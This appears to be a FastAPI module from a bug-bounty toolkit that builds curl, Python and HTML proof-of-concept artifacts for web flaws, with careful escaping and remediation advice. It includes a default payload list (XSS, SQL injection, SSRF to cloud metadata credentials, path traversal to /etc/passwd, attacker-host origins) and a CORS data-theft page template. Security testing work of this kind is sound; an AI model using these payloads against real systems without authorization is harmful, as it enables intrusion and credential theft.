"""Exploit PoC Generator — Context-Aware Proof-of-Concept & Reproduction Synthesizer.

Defends against code/command/HTML injection in generated PoC artifacts by applying
strict context-specific escaping:
- Shell: shlex.quote()
- Python: repr() / json.dumps()
- HTML: html.escape(..., quote=True)
- JavaScript: json.dumps()
- URL: urllib.parse.quote()
"""
from __future__ import annotations
import html
import json
import shlex
import urllib.parse
from typing import Any, Dict

from fastapi import APIRouter
from pydantic import BaseModel, Field

from backend.tools.utils import clean_url, err, f, ok

router = APIRouter(tags=["exploitation"])


class PocRequest(BaseModel):
    vuln_type: str = Field("xss", max_length=64)
    target: str = Field("https://example.com/search", min_length=1, max_length=2048)
    parameter: str = Field("q", max_length=128)
    custom_payload: str = Field("", max_length=2048)
    http_method: str = Field("GET", max_length=16)


DEFAULT_PAYLOADS = {
    "xss": "<script>alert(document.domain)</script>",
    "sqli": "' UNION SELECT 1,version(),user(),4-- -",
    "ssrf": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "ssti": "{{7*7}}",
    "cors": "https://evil-attacker.com",
    "open_redirect": "https://attacker.com",
    "lfi": "../../../../etc/passwd",
    "proto": "__proto__[polluted]=true",
}


def build_curl(target: str, param: str, payload: str, method: str) -> str:
    """Safely generate cURL command using shlex.quote to prevent shell command injection."""
    encoded_payload = urllib.parse.quote(payload)
    safe_param = urllib.parse.quote(param)

    if method.upper() == "POST":
        post_data = f"{safe_param}={encoded_payload}"
        return (
            f"curl -i -s -k -X POST {shlex.quote(target)} \\\n"
            f"  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) BB-Suite-PoC' \\\n"
            f"  -H 'Content-Type: application/x-www-form-urlencoded' \\\n"
            f"  -d {shlex.quote(post_data)}"
        )
    else:
        delim = "&" if "?" in target else "?"
        full_url = f"{target}{delim}{safe_param}={encoded_payload}"
        return (
            f"curl -i -s -k {shlex.quote(full_url)} \\\n"
            f"  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) BB-Suite-PoC'"
        )


def build_python_script(target: str, param: str, payload: str, method: str, vuln_type: str) -> str:
    """Safely generate Python exploit script using repr() to prevent code injection."""
    safe_target = repr(target)
    safe_param = repr(param)
    safe_payload = repr(payload)
    safe_method = repr(method.upper())
    safe_vuln = repr(vuln_type.upper())

    script = f'''#!/usr/bin/env python3
"""
Automated Exploit Proof of Concept (PoC)
Vulnerability: {vuln_type.upper()}
"""
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGET = {safe_target}
PARAM = {safe_param}
PAYLOAD = {safe_payload}
METHOD = {safe_method}
VULN_TYPE = {safe_vuln}

headers = {{
    "User-Agent": "Mozilla/5.0 (BugBounty-PoC-Runner/1.0; Authorized Security Assessment)",
    "Accept": "*/*",
}}

print(f"[*] Sending {{VULN_TYPE}} exploit to {{TARGET}}...")

try:
    if METHOD == "POST":
        data = {{PARAM: PAYLOAD}}
        res = requests.post(TARGET, data=data, headers=headers, verify=True, timeout=10)
    else:
        params = {{PARAM: PAYLOAD}}
        res = requests.get(TARGET, params=params, headers=headers, verify=True, timeout=10)

    print(f"[+] HTTP Status: {{res.status_code}}")
    print(f"[+] Response Length: {{len(res.text)}} bytes")

    if PAYLOAD in res.text:
        print("[✓] SUCCESS: Payload reflected directly in response body!")
    elif res.status_code == 200:
        print("[✓] Request completed successfully with HTTP 200.")
    print("\\n--- Response Preview (First 300 chars) ---")
    print(res.text[:300])

except Exception as err:
    print(f"[-] Execution failed: {{err}}")
'''
    return script


def build_html_poc(target: str, param: str, payload: str, method: str, vuln_type: str) -> str:
    """Safely generate HTML and JS PoC using html.escape and json.dumps."""
    escaped_target_attr = html.escape(target, quote=True)
    escaped_param_attr = html.escape(param, quote=True)
    escaped_payload_attr = html.escape(payload, quote=True)
    escaped_method_attr = html.escape(method.upper(), quote=True)
    escaped_vuln_text = html.escape(vuln_type.upper())

    # For JavaScript context:
    js_target = json.dumps(target)

    if vuln_type == "cors":
        return f'''<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>CORS Data Theft PoC</title>
</head>
<body>
  <h2>CORS Exploit Demonstration</h2>
  <button onclick="steal()">Exfiltrate Private Data</button>
  <pre id="log" style="background:#1e1e2e; color:#a6e3a1; padding:15px; border-radius:8px;"></pre>
  <script>
    function steal() {{
      var xhr = new XMLHttpRequest();
      xhr.open("GET", {js_target}, true);
      xhr.withCredentials = true;
      xhr.onreadystatechange = function() {{
        if (xhr.readyState === 4) {{
          document.getElementById("log").innerText = xhr.responseText;
        }}
      }};
      xhr.send();
    }}
  </script>
</body>
</html>'''

    return f'''<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>{escaped_vuln_text} Browser PoC</title>
</head>
<body>
  <h2>{escaped_vuln_text} Auto-Submit Form Exploit</h2>
  <form id="exploitForm" action="{escaped_target_attr}" method="{escaped_method_attr}">
    <input type="hidden" name="{escaped_param_attr}" value="{escaped_payload_attr}" />
  </form>
  <p>Triggering automatic request submission...</p>
  <script>
    document.getElementById("exploitForm").submit();
  </script>
</body>
</html>'''


def build_remediation(vuln_type: str) -> str:
    remediations = {
        "xss": "Contextually encode user input before rendering into HTML. In modern frameworks, use templating auto-escaping (React JSX, Angular) and set Content-Security-Policy: default-src 'self'.",
        "sqli": "Use parameterized prepared statements with bind variables. Never concatenate user variables into SQL queries (e.g., cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))).",
        "ssrf": "Implement an allowlist of permitted destination domains/IPs. Restrict server egress traffic, block RFC1918 private subnets and 169.254.169.254, and enforce IMDSv2 token headers.",
        "ssti": "Never pass user input into Template() render functions. Treat user input as template context variables, or use logic-less templating engines with sandboxing enabled.",
        "cors": "Specify explicit trusted origins in Access-Control-Allow-Origin. Never blindly echo the incoming Origin header when Access-Control-Allow-Credentials is true.",
        "open_redirect": "Validate redirect URLs against an allowlist of relative paths or strictly approved domains. Avoid taking unconstrained redirect targets from query parameters.",
        "lfi": "Avoid using user input in file system operations. Sanitize filenames with os.path.basename(), validate against a directory allowlist, or reference files by a lookup ID instead of path.",
        "proto": "Freeze Object.prototype via Object.freeze(Object.prototype), use Map or Object.create(null) for dictionary storage, and use safe JSON parsers.",
    }
    return remediations.get(vuln_type, "Implement strict input validation, principle of least privilege, and context-specific output encoding.")


@router.post("/poc_generator")
async def poc_generator(req: PocRequest):
    url = clean_url(req.target)
    v_type = req.vuln_type.lower().strip()
    param = req.parameter.strip() or "q"
    payload = req.custom_payload.strip() or DEFAULT_PAYLOADS.get(v_type, "<script>alert(1)</script>")
    method = req.http_method.upper().strip() or "GET"

    curl_code = build_curl(url, param, payload, method)
    python_code = build_python_script(url, param, payload, method, v_type)
    html_code = build_html_poc(url, param, payload, method, v_type)
    remediation_text = build_remediation(v_type)

    findings = [
        f(
            severity="info",
            title=f"Synthesized PoC for {v_type.upper()}",
            detail=f"Target: {url} | Parameter: {param} | Method: {method}",
            rec=remediation_text,
            confidence="confirmed",
        )
    ]

    records = [
        {"Artifact": "cURL Command", "Format": "Shell / Terminal (shlex-quoted)", "Ready": "✓ Ready to Execute"},
        {"Artifact": "Python Exploit Script", "Format": "Python 3 + requests (safe repr)", "Ready": "✓ Ready to Run"},
        {"Artifact": "Interactive HTML PoC", "Format": "HTML / JavaScript (escaped)", "Ready": "✓ Browser Ready"},
        {"Artifact": "Remediation Patch", "Format": "Best Practices Guide", "Ready": "✓ Ready for Devs"},
    ]

    combined_output = f"""=======================================================
[+] 1. REPRODUCTION cURL COMMAND
=======================================================
{curl_code}

=======================================================
[+] 2. STANDALONE PYTHON EXPLOIT SCRIPT
=======================================================
{python_code}

=======================================================
[+] 3. BROWSER HTML PROOF OF CONCEPT
=======================================================
{html_code}

=======================================================
[+] 4. DEVELOPER REMEDIATION GUIDELINE
=======================================================
{remediation_text}
"""

    return ok({
        "summary": {
            "Vulnerability": v_type.upper(),
            "Target URL": url,
            "Target Parameter": param,
            "HTTP Method": method,
            "PoC Artifacts Generated": 4,
        },
        "findings": findings,
        "records": records,
        "record_columns": ["Artifact", "Format", "Ready"],
        "raw": combined_output
    })
